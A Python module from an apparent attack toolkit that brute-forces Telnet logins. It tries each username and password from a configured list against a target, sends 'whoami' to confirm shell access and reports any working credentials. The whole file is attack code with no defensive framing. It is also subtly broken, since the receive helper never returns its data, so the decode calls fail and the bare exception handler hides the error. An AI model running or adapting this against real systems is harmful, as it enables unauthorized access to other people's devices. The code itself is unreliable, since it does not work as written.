"""Telnet exploitation"""

import socket
import time
from ..config import TELNET_CREDENTIALS, TELNET_TIMEOUT

def exploit_telnet_no_auth(target, port=23):
    """
    Test for Telnet without authentication using plain TCP socket
    Returns: Result dict or None
    """
    print(f"\n[*] Testing Telnet on {target}:{port}")
    
    credentials = TELNET_CREDENTIALS
    
    for username, password in credentials:
        try:
            # Open fresh socket per attempt
            s = socket.create_connection((target, port), timeout=TELNET_TIMEOUT)
            time.sleep(0.3)
            
            # Read initial prompt
            initial = _recv_some(s).decode(errors='ignore').lower()
            
            # Send username
            s.sendall((username + "\n").encode())
            time.sleep(0.5)
            after_user = _recv_some(s).decode(errors='ignore').lower()
            
            # Send password if prompted
            if 'password' in after_user or 'password:' in after_user:
                pw = password if password else ""
                s.sendall((pw + "\n").encode())
                time.sleep(0.8)
            
            # Test shell access
            s.sendall(b"whoami\n")
            time.sleep(1.0)
            result = _recv_some(s).decode(errors='ignore')
            
            # Check for shell-like output
            if username in result.lower() or '$' in result or '#' in result or 'root' in result.lower():
                print(f"    [+] SUCCESS! {username}:{password}")
                s.close()
                
                return {
                    'service': 'Telnet',
                    'port': port,
                    'username': username,
                    'password': password,
                    'status': 'success'
                }
            
            s.close()
            
        except Exception:
            pass
    
    print("    [-] No access obtained")
    return None


def _recv_some(s, wait=0.5):
    """Read available data from socket"""
    s.settimeout(0.5)
    out = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
            time.sleep(wait)
    except socket.timeout:
        pass
    except Exception:
        pass